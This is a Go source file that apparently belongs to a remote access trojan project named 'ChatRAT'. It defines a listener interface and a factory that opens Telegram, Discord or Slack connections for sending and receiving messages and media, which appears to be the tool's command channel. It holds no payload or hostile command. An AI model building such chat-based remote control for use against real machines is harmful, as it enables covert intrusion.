package listeners

import (
	"github.com/cyb3rjerry/ChatRAT/pkg/listeners/discord"
	"github.com/cyb3rjerry/ChatRAT/pkg/listeners/slack"
	"github.com/cyb3rjerry/ChatRAT/pkg/listeners/telegram"
)

type ListenerType int64

type ListenerConfig interface {
	telegram.TelegramConfig | discord.DiscordConfig | slack.SlackConfig
}

type Listener interface {
	SendMessage(string) error
	GetMessages() ([]string, error)
	SendMedia(string, string) error
	GetLatestMedia(string) error
}

func NewListener[T ListenerConfig](config T) (Listener, error) {
	switch config := any(config).(type) { // https://github.com/golang/go/issues/49206
	case telegram.TelegramConfig:
		bot, err := telegram.NewConn(config)
		if err != nil {
			return nil, err
		}
		return bot, nil
	case discord.DiscordConfig:
		bot, err := discord.NewConn(config)
		if err != nil {
			return nil, err
		}
		return bot, nil
	case slack.SlackConfig:
		return slack.NewConn(config)
	default:
		// Should never reach as the config argument is constrained
		panic("Unknown listener type")
	}
}
